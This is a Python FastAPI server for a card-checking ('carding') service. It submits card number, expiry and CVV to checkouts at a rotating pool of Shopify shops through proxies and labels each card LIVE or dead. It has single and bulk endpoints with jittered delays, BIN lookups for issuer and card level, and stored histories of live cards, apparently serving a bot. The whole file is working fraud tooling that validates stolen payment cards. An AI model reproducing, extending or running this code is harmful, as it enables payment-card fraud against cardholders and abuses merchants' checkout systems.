import os
import time
import random
import threading

from fastapi import FastAPI, Header, HTTPException, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional

from proxy_manager import proxy_mgr
from shop_scanner  import shop_pool
from checkout      import run_checkout
from bin_cache     import bin_lookup
from utils         import validate_card, dup_filter
from rate_limiter  import is_rate_limited
from history       import (
    record,
    get_stats,
    get_hourly,
    get_live_history,
    get_dead_history,
    get_logs,
)

API_KEY = os.environ.get("API_KEY", "kanha-secret-2024")
app     = FastAPI(docs_url=None, redoc_url=None)


# ─────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────

@app.on_event("startup")
async def on_startup():
    threading.Thread(target=proxy_mgr.start, daemon=True).start()
    threading.Thread(target=shop_pool.start, daemon=True).start()
    print("[+] background workers started")


# ─────────────────────────────────────────
# GLOBAL ERROR HANDLER
# ─────────────────────────────────────────

@app.exception_handler(Exception)
async def global_error(request: Request, exc: Exception):
    return JSONResponse(
        status_code=500,
        content={"error": str(exc)}
    )


# ─────────────────────────────────────────
# CORE LOGIC
# ─────────────────────────────────────────

def check_card(cc, month, year, cvv):
    for attempt in range(3):
        shop = shop_pool.get()
        if not shop:
            time.sleep(2)
            continue
        try:
            result = run_checkout(shop, cc, month, year, cvv)
            if result["result"] == "ERROR":
                shop_pool.mark_fail(shop["domain"])
                continue
            shop_pool.mark_win(shop["domain"])
            result["shop"] = shop["domain"]
            return result
        except Exception as e:
            shop_pool.mark_fail(shop["domain"])
            if attempt == 2:
                return {
                    "result":  "ERROR",
                    "reason":  str(e),
                    "message": "",
                    "amount":  "0.00",
                    "shop":    shop["domain"],
                }
            time.sleep(1.0)

    return {
        "result":  "ERROR",
        "reason":  "MAX_RETRIES",
        "message": "",
        "amount":  "0.00",
        "shop":    "none",
    }


def format_resp(cc, month, year, cvv, result, elapsed):
    try:
        bin_data = bin_lookup(cc)
    except Exception:
        bin_data = {
            "brand":   "UNKNOWN",
            "issuer":  "UNKNOWN",
            "country": "UNKNOWN",
            "emoji":   "🌐",
            "type":    "UNKNOWN",
            "level":   "UNKNOWN",
        }

    country = f"{bin_data['emoji']} {bin_data['country']}"
    is_live = result.get("result") == "LIVE"

    return {
        "cc":       f"{cc}|{month}|{year}|{cvv}",
        "Gateway":  "Shopify Payments",
        "Response": result.get("reason", "UNKNOWN"),
        "Amount":   result.get("amount", "1.00"),
        "Currency": "USD",
        "Brand":    bin_data["brand"],
        "Type":     bin_data["type"],
        "Level":    bin_data["level"],
        "Issuer":   bin_data["issuer"],
        "Country":  country,
        "Shop":     result.get("shop", ""),
        "Status":   is_live,
        "Proxy":    "Used" if proxy_mgr.status()["live"] > 0 else "Not Used",
        "Time":     f"{elapsed:.2f}s",
    }


# ─────────────────────────────────────────
# MODELS
# ─────────────────────────────────────────

class CardReq(BaseModel):
    cc:    str
    month: str
    year:  str
    cvv:   str


class BulkReq(BaseModel):
    cards: list[str]
    delay: Optional[float] = 1.2


# ─────────────────────────────────────────
# GET ROUTES — browser se seedha
# ─────────────────────────────────────────

@app.get("/")
def root():
    try:
        alive = sum(1 for s in shop_pool._shops if s["healthy"])
        total = len(shop_pool._shops)
        prx   = proxy_mgr.status()["live"]
    except Exception:
        alive = 0
        total = 0
        prx   = 0
    return {
        "status":  "alive",
        "shops":   f"{alive}/{total}",
        "proxies": prx,
    }


@app.get("/check")
def check_get(
    cc:    str,
    month: str,
    year:  str,
    cvv:   str,
    key:   str = "",
):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")

    if is_rate_limited(key):
        raise HTTPException(status_code=429, detail="RATE_LIMIT_EXCEEDED")

    ok, reason = validate_card(cc, month, year, cvv)
    if not ok:
        return {
            "cc":       f"{cc}|{month}|{year}|{cvv}",
            "Response": reason,
            "Status":   False,
            "Time":     "0.00s",
        }

    if dup_filter.is_duplicate(cc):
        return {
            "cc":       f"{cc}|{month}|{year}|{cvv}",
            "Response": "DUPLICATE_CARD",
            "Status":   False,
            "Time":     "0.00s",
        }

    start   = time.time()
    res     = check_card(cc, month, year, cvv)
    elapsed = time.time() - start
    out     = format_resp(cc, month, year, cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out


@app.get("/shops")
def shops_get(key: str = ""):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    return {"shops": shop_pool.status()}


@app.get("/proxies")
def proxies_get(key: str = ""):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    return proxy_mgr.status()


@app.get("/stats")
def stats_get(key: str = ""):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    return {
        "global": get_stats(),
        "hourly": get_hourly(),
    }


@app.get("/history/live")
def live_hist_get(key: str = ""):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    return {"cards": get_live_history()}


@app.get("/history/dead")
def dead_hist_get(key: str = ""):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    return {"cards": get_dead_history()}


@app.get("/logs")
def logs_get(key: str = ""):
    if key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    return {"logs": get_logs()}


# ─────────────────────────────────────────
# POST ROUTES — bot ke liye
# ─────────────────────────────────────────

@app.post("/check")
def check_post(card: CardReq, x_api_key: str = Header(...)):
    if x_api_key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")

    if is_rate_limited(x_api_key):
        raise HTTPException(status_code=429, detail="RATE_LIMIT_EXCEEDED")

    ok, reason = validate_card(card.cc, card.month, card.year, card.cvv)
    if not ok:
        return {
            "cc":       f"{card.cc}|{card.month}|{card.year}|{card.cvv}",
            "Response": reason,
            "Status":   False,
            "Time":     "0.00s",
        }

    if dup_filter.is_duplicate(card.cc):
        return {
            "cc":       f"{card.cc}|{card.month}|{card.year}|{card.cvv}",
            "Response": "DUPLICATE_CARD",
            "Status":   False,
            "Time":     "0.00s",
        }

    start   = time.time()
    res     = check_card(card.cc, card.month, card.year, card.cvv)
    elapsed = time.time() - start
    out     = format_resp(card.cc, card.month, card.year, card.cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out


@app.post("/bulk")
def bulk_post(req: BulkReq, x_api_key: str = Header(...)):
    if x_api_key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")

    results = []

    for line in req.cards:
        try:
            p = line.strip().split("|")
            if len(p) != 4:
                results.append({
                    "cc":       line,
                    "Response": "BAD_FORMAT",
                    "Status":   False,
                })
                continue

            cc, month, year, cvv = p

            ok, reason = validate_card(cc, month, year, cvv)
            if not ok:
                results.append({
                    "cc":       line,
                    "Response": reason,
                    "Status":   False,
                })
                continue

            if dup_filter.is_duplicate(cc):
                results.append({
                    "cc":       line,
                    "Response": "DUPLICATE_CARD",
                    "Status":   False,
                })
                continue

            start   = time.time()
            res     = check_card(cc, month, year, cvv)
            elapsed = time.time() - start
            out     = format_resp(cc, month, year, cvv, res, elapsed)
            record(out["cc"], res, elapsed)
            results.append(out)
            time.sleep(req.delay + random.uniform(0, 0.3))

        except Exception as e:
            results.append({
                "cc":       line,
                "Response": str(e),
                "Status":   False,
            })

    return {
        "total":   len(results),
        "live":    sum(1 for r in results if r.get("Status")),
        "dead":    sum(1 for r in results if not r.get("Status")),
        "results": results,
    }


@app.post("/duplicate/clear")
def clear_dup(x_api_key: str = Header(...)):
    if x_api_key != API_KEY:
        raise HTTPException(status_code=401, detail="INVALID_KEY")
    dup_filter.clear()
    return {"status": "cleared"}
